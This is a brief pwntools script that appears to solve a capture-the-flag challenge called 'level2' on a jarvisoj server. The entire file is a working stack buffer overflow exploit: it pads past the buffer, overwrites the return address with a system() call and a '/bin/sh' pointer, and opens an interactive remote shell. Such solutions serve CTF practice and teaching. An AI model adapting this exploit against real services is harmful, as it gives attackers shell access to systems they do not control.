from pwn import *

r=remote("pwn2.jarvisoj.com",9878)

#r=process("./level2")

r.recvuntil("Input:")

addr=0x0804845C

sh=0x804A024

payload=(0x88+0x4)*"a"+p32(addr)+p32(sh)

r.sendline(payload)

r.interactive()




